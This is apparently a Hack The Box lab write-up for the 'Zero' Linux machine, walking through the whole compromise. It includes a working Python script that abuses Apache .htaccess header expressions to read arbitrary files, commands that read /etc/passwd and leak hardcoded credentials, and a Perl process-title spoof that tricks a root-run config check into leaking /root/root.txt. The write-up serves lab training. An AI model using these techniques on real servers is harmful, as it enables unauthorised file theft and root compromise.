# HTB Zero Writeup

## Summary

Zero is an Insane Linux machine running SSH and an Apache web application. The web app allows users to create temporary SFTP credentials and upload personal web content. The foothold comes from abusing Apache `.htaccess` header expressions to perform arbitrary file reads through the `file:` and `base64:` expression functions. This allows reading PHP source files from the web root, exposing hardcoded credentials for `zroadmin`. Privilege escalation abuses a root-executed Apache configuration validation script that trusts process command-line arguments matched by `pgrep`. By creating a fake Apache process with injected arguments, a malicious Apache configuration is tested as root, leaking `/root/root.txt` through an Apache syntax error. 

---

## Enumeration

The target hostname was added to `/etc/hosts`:

```bash
echo "10.129.234.62 zero.vl" | sudo tee -a /etc/hosts
```

Initial Nmap scan:

```bash
nmap -Pn -A --top-ports 3000 zero.vl
```

Open ports:

```text
22/tcp open  ssh   OpenSSH 8.2p1 Ubuntu
80/tcp open  http  Apache httpd 2.4.41
```

The web application on port 80 exposed a signup/checkout flow that generated a personal SFTP account.

Generated credentials:

```text
Username: zro-8621553a
Password: 35e2cb83
```

---

## SFTP Access

Using the generated credentials, SFTP access was possible:

```bash
sftp zro-8621553a@zero.vl
```

Inside the SFTP session:

```sftp
ls
cd public_html
ls -lah
get .htaccess
exit
```

The personal web directory contained:

```text
.htaccess
index.html
```

The `.htaccess` file was interesting because Apache allows certain directives inside it, including `Header` rules.

---

## Foothold: `.htaccess` Arbitrary File Read

The vulnerability was in Apache header expressions. The official writeup shows that Apache’s `mod_headers` expression syntax can use functions such as `file:` and `base64:`. This allows reading a local file and returning the result inside an HTTP response header. 

The malicious `.htaccess` payload format was:

```apache
Header always set X-Leak "expr=%{base64:%{file:/path/to/file}}"
```

This reads the file, base64-encodes the content, and returns it in the `X-Leak` response header.

---

## Exploit Script

A Python helper script was used to automate overwriting `.htaccess`, requesting the personal web page, extracting the `X-Leak` header, and decoding the file content.

```python
#!/usr/bin/env python3

import base64
import requests
import paramiko
import sys

HOST = "zero.vl"
PORT = 22

SFTP_USER = "zro-8621553a"
SFTP_PASS = "35e2cb83"

WEB_PATH = f"http://{HOST}/~{SFTP_USER}/"
LOCAL_HTACCESS = "/tmp/.htaccess"
REMOTE_HTACCESS = "public_html/.htaccess"


def sftp_upload(host, port, username, password, local_file, remote_path):
    try:
        transport = paramiko.Transport((host, port))
        transport.connect(username=username, password=password)

        sftp = paramiko.SFTPClient.from_transport(transport)

        try:
            sftp.remove(remote_path)
        except IOError:
            pass

        sftp.put(local_file, remote_path)

        sftp.close()
        transport.close()
        return True

    except Exception as e:
        print(f"[!] Error uploading file: {e}")
        return False


def read_file(target_file):
    payload = f'Header always set X-Leak "expr=%{{base64:%{{file:{target_file}}}}}"\n'

    with open(LOCAL_HTACCESS, "w") as f:
        f.write(payload)

    if not sftp_upload(HOST, PORT, SFTP_USER, SFTP_PASS, LOCAL_HTACCESS, REMOTE_HTACCESS):
        sys.exit(1)

    r = requests.get(WEB_PATH)

    if "X-Leak" not in r.headers:
        print("[!] X-Leak header not found")
        print(r.headers)
        sys.exit(1)

    encoded = r.headers["X-Leak"]
    decoded = base64.b64decode(encoded).decode(errors="replace")

    print(decoded)


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} /path/to/file")
        sys.exit(1)

    read_file(sys.argv[1])
```

Because Kali blocks system-wide `pip` installs, a virtual environment was used:

```bash
cd /home/zendeni/htb_labs/zero

python3 -m venv venv
source venv/bin/activate

python3 -m pip install --upgrade pip
python3 -m pip install requests paramiko
chmod +x fileread.py
```

The arbitrary file read was confirmed with `/etc/passwd`:

```bash
python3 fileread.py /etc/passwd
```

Relevant users found:

```text
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
zroadmin:x:666:666::/home/zroadmin:/bin/bash
zro-8621553a:x:1002:1002::/home/zro-8621553a:/bin/false
```

The successful `/etc/passwd` read confirmed that the `.htaccess` file-read primitive worked. 

---

## Leaking Web Source Code

Next, the web application source was read:

```bash
python3 fileread.py /var/www/html/stats.php
```

The PHP source exposed hardcoded database credentials:

```php
$mysqli = new mysqli("localhost", "zroadmin", "correct-horse-battery-staple", "zro");
```

This revealed reusable credentials for the local user `zroadmin`. 

Credentials:

```text
Username: zroadmin
Password: correct-horse-battery-staple
```

---

## SSH as `zroadmin`

The leaked credentials worked over SSH:

```bash
ssh zroadmin@zero.vl
```

Password:

```text
correct-horse-battery-staple
```

After login, the user flag was readable:

```bash
ls -la
cat user.txt
```
---

## Privilege Escalation Enumeration

The script `/usr/local/bin/zro.web-confcheck` was inspected:

```bash
cat /usr/local/bin/zro.web-confcheck
```

Script content:

```bash
#!/usr/bin/bash
RET=0
while read pid _cmd ; do
        # Replace apache2 with apache2ctl and add -t for test
        cmd="${_cmd/apache2/apache2ctl} -t"
        $cmd >/dev/null 2>&1
        RET=$?
done <<< $(/usr/bin/pgrep -lfa "^/opt/zroweb/sbin/apache2.-k.start.-d./opt/zroweb/conf")
if [[ $RET -eq 0 ]] ; then
        echo 'Configuration correct. \o/'
else
        echo 'Configuration broken. Please fix immediately!' >&2
fi
exit $RET
```

The important behavior is:

```bash
/usr/bin/pgrep -lfa "^/opt/zroweb/sbin/apache2.-k.start.-d./opt/zroweb/conf"
```

The script searches for a process whose command line starts with:

```text
/opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf
```

Then it replaces `apache2` with `apache2ctl`, appends `-t`, and executes the resulting command.

This is unsafe because the command line of the matched process is trusted. If a fake process matches the expected Apache command line but includes extra arguments, those arguments are passed into `apache2ctl` when the root-owned config check runs. The official writeup abuses this by injecting an additional Apache config directory and error log path. 

---

## Preparing a Poisoned Apache Configuration

A writable copy of the Apache configuration was created:

```bash
cd ~
cp -r /etc/apache2 .
cd apache2
```

The main Apache config was modified to include `/root/root.txt` as the first line:

```bash
sed -i '1i Include /root/root.txt' apache2.conf
```

The default error log path used an Apache environment variable, so it was changed to a writable local path:

```bash
sed -i 's#ErrorLog ${APACHE_LOG_DIR}/error.log#ErrorLog /home/zroadmin/apache2/error.log#' apache2.conf
```

Verification:

```bash
head -n 5 apache2.conf
grep -n "ErrorLog" apache2.conf
```

Expected result:

```text
Include /root/root.txt
# This is the main Apache server configuration file...
```

And:

```text
ErrorLog /home/zroadmin/apache2/error.log
```

The goal was not to execute `/root/root.txt`. The goal was to make Apache parse `/root/root.txt` as a configuration file. Since the root flag is not valid Apache syntax, Apache leaks it inside a syntax error.

---

## Fake Apache Process Injection

A Perl script was created to spoof the process command line:

```bash
cat > root.pl <<'EOF'
#!/usr/bin/perl

$0 = "/opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf -d /home/zroadmin/apache2 -E /home/zroadmin/apache2/log.txt";

sleep(100000);
EOF

chmod +x root.pl
```

The process title starts with the exact command pattern expected by the root config-check script:

```text
/opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf
```

Then it appends attacker-controlled arguments:

```text
-d /home/zroadmin/apache2
-E /home/zroadmin/apache2/log.txt
```

These cause the root script to test the attacker-controlled Apache configuration and write Apache errors to a readable log file.

The fake process was started:

```bash
./root.pl
```

This terminal was left running.

---

## Reading the Root Flag

In a second SSH session:

```bash
ssh zroadmin@zero.vl
```

Then:

```bash
cd ~/apache2
tail -F log.txt
```

After the root config-check job executed, Apache attempted to parse `/root/root.txt` because of the malicious `Include` directive. Since the flag is not a valid Apache directive, the error log leaked it in this format:

```text
AH00526: Syntax error on line 1 of /root/root.txt:
Invalid command 'ROOT_FLAG_HERE', perhaps misspelled or defined by a module not included in the server configuration
```

The value inside the quotes was the root flag.

---

## Attack Chain

```text
1. Enumerate HTTP and SSH.
2. Use the web application to generate SFTP credentials.
3. Log in over SFTP and access public_html.
4. Abuse .htaccess with Apache Header expressions.
5. Use file: and base64: to read arbitrary local files.
6. Read /var/www/html/stats.php.
7. Extract hardcoded zroadmin credentials.
8. SSH as zroadmin.
9. Read user.txt.
10. Inspect /usr/local/bin/zro.web-confcheck.
11. Identify unsafe pgrep + command-line trust behavior.
12. Copy Apache config locally.
13. Add Include /root/root.txt to attacker-controlled apache2.conf.
14. Start fake Apache process using Perl process-title spoofing.
15. Wait for root config-check script.
16. Read Apache syntax error from log.txt.
17. Extract root flag.
```

---

## Key Commands

```bash
echo "10.129.234.62 zero.vl" | sudo tee -a /etc/hosts
nmap -Pn -A --top-ports 3000 zero.vl
```

```bash
sftp zro-8621553a@zero.vl
```

```sftp
cd public_html
get .htaccess
exit
```

```bash
python3 -m venv venv
source venv/bin/activate
python3 -m pip install --upgrade pip
python3 -m pip install requests paramiko
chmod +x fileread.py
```

```bash
python3 fileread.py /etc/passwd
python3 fileread.py /var/www/html/stats.php
```

```bash
ssh zroadmin@zero.vl
```

```bash
cat user.txt
cat /usr/local/bin/zro.web-confcheck
```

```bash
cd ~
cp -r /etc/apache2 .
cd apache2

sed -i '1i Include /root/root.txt' apache2.conf
sed -i 's#ErrorLog ${APACHE_LOG_DIR}/error.log#ErrorLog /home/zroadmin/apache2/error.log#' apache2.conf
```

```bash
cat > root.pl <<'EOF'
#!/usr/bin/perl

$0 = "/opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf -d /home/zroadmin/apache2 -E /home/zroadmin/apache2/log.txt";

sleep(100000);
EOF

chmod +x root.pl
./root.pl
```

Second SSH session:

```bash
cd ~/apache2
tail -F log.txt
```
